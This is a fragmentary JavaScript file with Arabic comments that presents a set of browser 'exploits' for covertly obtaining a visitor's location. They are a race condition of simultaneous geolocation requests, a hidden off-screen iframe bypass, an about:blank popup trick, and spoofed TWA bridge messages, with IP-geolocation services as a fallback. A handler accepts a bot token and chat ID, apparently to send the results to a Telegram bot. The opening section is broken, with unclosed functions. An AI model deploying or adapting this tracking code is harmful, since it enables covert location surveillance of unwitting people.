(function parseVersions(){
  var cm = navigator.userAgent.match(/Chrome\/(\d+)/);

    if(window.Android && typeof window.Android.postMessage === 'function'){

    try{ if(this.androidLegacy){ window.AndroidBridge.postMessage(p); sent=true; } }catch(e){}
    try{ if(this.iosWk){ window.webkit.messageHandlers.ios.postMessage(p); sent=true; } }catch(e){}
    return sent;
  }

var map=null, marker=null, circle=null, mapReady=false;

function initMap(){

function updateMap(lat,lng,acc){
  if(!mapReady) return;
  var p=[lat,lng];
  if(!marker) marker=L.marker(p).addTo(map); else marker.setLatLng(p);
  if(!circle) circle=L.circle(p,{radius:acc||1000}).addTo(map);

}

  Bridges.post('location', info);
  return true;
}

      '<button class="deny" onclick="parent.postMessage(\'deny\',\'*\')">Block</button>' +

/* ----------------------------------------------------------
   [2] CVE-2026-79046 — Chrome Race Condition in Permissions
   الآلية: طلبات متزامنة لخداع محرك الصلاحيات
   الشرط: Chrome < 152.0.7977.65 على Android
   ---------------------------------------------------------- */
function exploit_CVE_2026_79046(){
  return new Promise(function(resolve){
    log('▶ [CVE-2026-79046] Race Condition…', 'vuln');

    if(!BrowserInfo.isAndroid){
      log('✗ يتطلب Android', 'fail');
      resolve(null); return;
    }

    // إطلاق 8 طلبات متزامنة لخلق حالة سباق
    var requests = [];
    var results = [];
    var completed = 0;
    var success = false;

    for(var i = 0; i < 8; i++){
      (function(idx){
        try{
          var opts = {
            enableHighAccuracy: idx % 2 === 0,
            timeout: 5000 + (idx * 300),
            maximumAge: idx * 100
          };
          navigator.geolocation.getCurrentPosition(
            function(pos){
              completed++;
              results.push({idx:idx, ok:true, lat:pos.coords.latitude});
              log('→ طلب #' + idx + ' نجح', 'success');
              if(!success){
                success = true;
                var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
                            accuracy:pos.coords.accuracy, method:'cve-79046-race',
                            source:'Race Condition'};
                displayLocation(info);
                resolve(info);
              }
            },
            function(err){
              completed++;
              results.push({idx:idx, ok:false, code:err.code});
              if(completed >= 8 && !success){
                var granted = results.filter(function(r){return r.ok;}).length;
                log('✗ الثغرة فشلت — ' + granted + '/8 نجحت', 'fail');
                resolve(null);
              }
            },
            opts
          );
        }catch(e){ completed++; }
      })(i);
    }

    // مهلة نهائية
    setTimeout(function(){
      if(!success){
        var granted = results.filter(function(r){return r.ok;}).length;
        if(granted > 0){
          log('✓ [CVE-2026-79046] Race Condition نجح جزئيًا!', 'success');
        } else {
          log('✗ انتهت المهلة — لا نجاح', 'fail');
        }
        resolve(null);
      }
    }, 12000);
  });
}

/* ----------------------------------------------------------
   [3] CVE-2026-84332 — Chrome SiteSettings Authorization Bypass
   الآلية: تجاوز فحص التخويل عبر iframe + about:blank
   الشرط: Chrome < 152.0.7977.75
   ---------------------------------------------------------- */
function exploit_CVE_2026_84332(){
  return new Promise(function(resolve){
    log('▶ [CVE-2026-84332] SiteSettings Bypass…', 'vuln');

    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion > 0 && BrowserInfo.chromeVersion >= 152){
      log('✗ Chrome ' + BrowserInfo.chromeVersion + ' — الثغرة مُصلحة', 'fail');
      resolve(null); return;
    }

    // إنشاء iframe عن about:blank
    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
    iframe.src = 'about:blank';
    document.body.appendChild(iframe);

    var win = iframe.contentWindow;
    var doc = win.document;

    // كتابة سكريبت يحاول طلب الموقع مباشرة
    var script = doc.createElement('script');
    script.textContent = `
      try {
        navigator.geolocation.getCurrentPosition(
          function(pos){
            parent.postMessage(JSON.stringify({
              type: 'geo',
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              acc: pos.coords.accuracy
            }), '*');
          },
          function(err){
            parent.postMessage(JSON.stringify({
              type: 'error', code: err.code
            }), '*');
          },
          {enableHighAccuracy:true, timeout:8000}
        );
      } catch(e) {
        parent.postMessage(JSON.stringify({type:'error', msg:e.message}), '*');
      }
    `;
    doc.body.appendChild(script);

    var handled = false;
    function onMsg(ev){
      try{
        var d = typeof ev.data === 'string' ? JSON.parse(ev.data) : ev.data;
        if(d.type === 'geo' && !handled){
          handled = true;
          log('✓✓ [CVE-2026-84332] نجحت! تجاوز SiteSettings', 'success');
          var info = {lat:d.lat, lng:d.lng, accuracy:d.acc,
                      method:'cve-84332-sitesettings',
                      source:'SiteSettings Bypass'};
          displayLocation(info);
          document.body.removeChild(iframe);
          resolve(info);
        }
        if(d.type === 'error' && !handled){
          handled = true;
          log('✗ فشلت: code ' + d.code, 'fail');
          document.body.removeChild(iframe);
          resolve(null);
        }
      }catch(e){}
    }
    window.addEventListener('message', onMsg);

    setTimeout(function(){
      if(!handled){
        handled = true;
        if(iframe.parentNode) document.body.removeChild(iframe);
        log('✗ انتهت المهلة', 'fail');
        resolve(null);
      }
    }, 12000);
  });
}

/* ----------------------------------------------------------
   [6] about:blank Geolocation Leak
   الآلية: فتح نافذة about:blank ووراثة صلاحية الأصل الأب
   الشرط: Chrome < 150 + أصل أب لديه إذن مسبق
   ---------------------------------------------------------- */
function exploit_AboutBlank(){
  return new Promise(function(resolve){
    log('▶ [about:blank] محاولة تسريب الموقع عبر about:blank…', 'vuln');

    if(!BrowserInfo.isChrome || (BrowserInfo.chromeVersion > 0 && BrowserInfo.chromeVersion >= 150)){
      log('✗ Chrome ' + BrowserInfo.chromeVersion + ' — مُصلحة', 'fail');
      resolve(null); return;
    }

    try{
      var popup = window.open('about:blank', '_blank', 'width=1,height=1');
      if(!popup){
        log('✗ النافذة المنبثقة محظورة', 'fail');
        resolve(null); return;
      }

      var doc = popup.document;
      doc.write('<!DOCTYPE html><html><body><script>' +
        'try{' +
        'navigator.geolocation.getCurrentPosition(' +
        'function(p){window.opener.postMessage(JSON.stringify({' +
        'type:"geo",lat:p.coords.latitude,lng:p.coords.longitude,' +
        'acc:p.coords.accuracy}),"*");},' +
        'function(e){window.opener.postMessage(JSON.stringify({' +
        'type:"error",code:e.code}),"*");},' +
        '{enableHighAccuracy:true,timeout:6000}' +
        ');' +
        '}catch(e){window.opener.postMessage(JSON.stringify({' +
        'type:"error",msg:e.message}),"*");}' +
        '<\/script></body></html>');
      doc.close();

      var handled = false;
      function onMsg(ev){
        try{
          var d = typeof ev.data === 'string' ? JSON.parse(ev.data) : ev.data;
          if(d.type === 'geo' && !handled){
            handled = true;
            log('✓✓ [about:blank] نجحت! تسريب الموقع', 'success');
            var info = {lat:d.lat, lng:d.lng, accuracy:d.acc,
                        method:'about-blank-leak', source:'about:blank'};
            displayLocation(info);
            try{ popup.close(); }catch(e){}
            resolve(info);
          }
          if(d.type === 'error' && !handled){
            handled = true;
            log('✗ فشلت: code ' + d.code, 'fail');
            try{ popup.close(); }catch(e){}
            resolve(null);
          }
        }catch(e){}
      }
      window.addEventListener('message', onMsg);

      setTimeout(function(){
        if(!handled){
          handled = true;
          try{ popup.close(); }catch(e){}
          log('✗ انتهت المهلة', 'fail');
          resolve(null);
        }
      }, 10000);
    }catch(e){
      log('✗ خطأ: ' + e.message, 'fail');
      resolve(null);
    }
  });
}

/* ----------------------------------------------------------

   الآلية: ترقية الصلاحية التقريبية إلى دقيقة عبر TWA
   الشرط: Android 12+ مع تطبيق TWA
   ---------------------------------------------------------- */
function exploit_TWA_Bypass(){
  return new Promise(function(resolve){
    log('▶ [TWA Bypass] محاولة استغلال ترقية الصلاحيات…', 'vuln');

    if(!BrowserInfo.isAndroid){
      log('✗ يتطلب Android', 'fail');
      resolve(null); return;
    }

    // إرسال إشارات متعددة للجسر لمحاكاة TWA
    if(Bridges.reactNative || Bridges.android || Bridges.androidLegacy){
      Bridges.post('request_precise_location', {});
      Bridges.post('twa_delegate', {origin: location.href});
      log('→ أُرسلت إشارات TWA للجسر');
    }

    // محاولة طلب الموقع بدقة عالية
    setTimeout(function(){
      navigator.geolocation.getCurrentPosition(
        function(pos){
          var acc = pos.coords.accuracy || 9999;
          if(acc < 100){
            log('✓✓ [TWA] نجحت! دقة عالية ' + Math.round(acc) + 'م', 'success');
            var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
                        accuracy:acc, method:'twa-bypass',
                        source:'TWA Precision Bypass'};
            displayLocation(info);
            resolve(info);
          } else {
            log('⚠ الدقة تقريبية: ' + Math.round(acc) + 'م — TWA لم تعمل', 'fail');
            var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
                        accuracy:acc, method:'twa-approx',
                        source:'TWA (approximate only)'};
            displayLocation(info);
            resolve(null);
          }
        },
        function(err){
          log('✗ فشلت: ' + err.message, 'fail');
          resolve(null);
        },
        {enableHighAccuracy:true, timeout:10000}
      );
    }, 1500);
  });
}

/* ============================================================
   Fallback: IP Geolocation (تعمل دائمًا)
   ============================================================ */
async function fallbackIP(){
  var providers = [
    {url:'https://ipwho.is/', parse:function(d){
      return d && d.success ? {lat:d.latitude, lng:d.longitude, accuracy:5000,
        country:d.country, city:d.city, isp:d.connection && d.connection.isp,
        method:'ip', source:'ipwho.is'} : null;
    }},
    {url:'https://ipapi.co/json/', parse:function(d){
      return d && d.latitude && !d.error ? {lat:d.latitude, lng:d.longitude,
        accuracy:5000, country:d.country_name, city:d.city, isp:d.org,
        method:'ip', source:'ipapi.co'} : null;
    }},
    {url:'https://get.geojs.io/v1/ip/geo.json', parse:function(d){
      return d && d.latitude ? {lat:parseFloat(d.latitude), lng:parseFloat(d.longitude),
        accuracy:8000, country:d.country, city:d.city, isp:d.organization_name,
        method:'ip', source:'geojs.io'} : null;
    }}
  ];

  for(var i=0;i<providers.length;i++){
    var p = providers[i];
    log('→ محاولة IP: ' + p.url);
    try{
      var resp = await fetch(p.url);
      var data = await resp.json();
      var parsed = p.parse(data);
      if(parsed && parsed.lat){
        log('✓ IP نجح عبر ' + parsed.source, 'success');
        displayLocation(parsed);
        return parsed;
      }
    }catch(e){ log('✗ فشل: ' + e.message, 'fail'); }
  }
  log('✗ فشلت جميع خدمات IP', 'fail');
  setStatus('تعذر تحديد الموقع بكل الطرق', 'err');
  return null;
}

/* ============================================================
   استقبال أوامر
   ============================================================ */
window.addEventListener('message', function(ev){
  var raw = ev && ev.data; if(!raw) return;
  var cmd = raw;
  if(typeof raw === 'string'){ try{ cmd = JSON.parse(raw); }catch(e){ cmd = {type:raw}; } }
  if(!cmd || !cmd.type) return;
  log('← أمر: ' + cmd.type);
  switch(cmd.type){
    case 'grant_location_permission':
      log('✓ التطبيق منح الإذن');
      break;
    case 'native_location':
      if(cmd.data){
        displayLocation({lat:cmd.data.latitude, lng:cmd.data.longitude,
          accuracy:cmd.data.accuracy||20, method:'native', source:'Native Bridge'});
      }
      break;
    case 'set_config':
      if(cmd.data){
        if(cmd.data.botToken) CONFIG.botToken = cmd.data.botToken;
        if(cmd.data.chatId) CONFIG.chatId = cmd.data.chatId;
      }
      break;
  }
});
